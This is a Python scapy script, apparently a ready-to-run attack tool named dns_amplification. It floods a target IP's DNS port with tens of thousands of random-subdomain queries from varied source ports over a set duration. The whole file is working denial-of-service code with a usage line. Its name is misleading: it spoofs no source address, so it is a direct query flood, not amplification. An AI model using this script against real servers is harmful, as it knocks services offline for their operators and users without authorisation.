#!/usr/bin/env python3
import scapy.all as scapy
import random
import time
import sys
import string


record_types = ["A", "AAAA", "TXT"]


def random_domain():
    sub = ''.join(random.choice(string.ascii_lowercase) for _ in range(8))
    return f"{sub}.example.com"


def build_flow_pool(flow_count):
    pool = []
    for _ in range(flow_count):
        pool.append(random.randint(20000, 65000))  # sport only
    return pool


def dns_amplification(target_ip, duration, total_flows):

    flow_pool = build_flow_pool(total_flows)
    flows_created = 0
    start = time.time()

    for sport in flow_pool:

        if flows_created >= total_flows:
            break

        if time.time() - start > duration:
            break

        pkt = (
            scapy.IP(dst=target_ip) /
            scapy.UDP(sport=sport, dport=53) /
            scapy.DNS(
                rd=1,
                qd=scapy.DNSQR(
                    qname=random_domain(),
                    qtype=random.choice(record_types)
                )
            )
        )

        scapy.send(pkt, verbose=0)

        flows_created += 1
        time.sleep(0.0004)

    print(f"Approx DNS flows generated: {flows_created}")


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: dns_amplification.py <target_ip> <duration> [total_flows]")
        sys.exit(1)

    target_ip = sys.argv[1]
    duration = int(sys.argv[2])
    total_flows = int(sys.argv[3]) if len(sys.argv) > 3 else 60000

    dns_amplification(target_ip, duration, total_flows)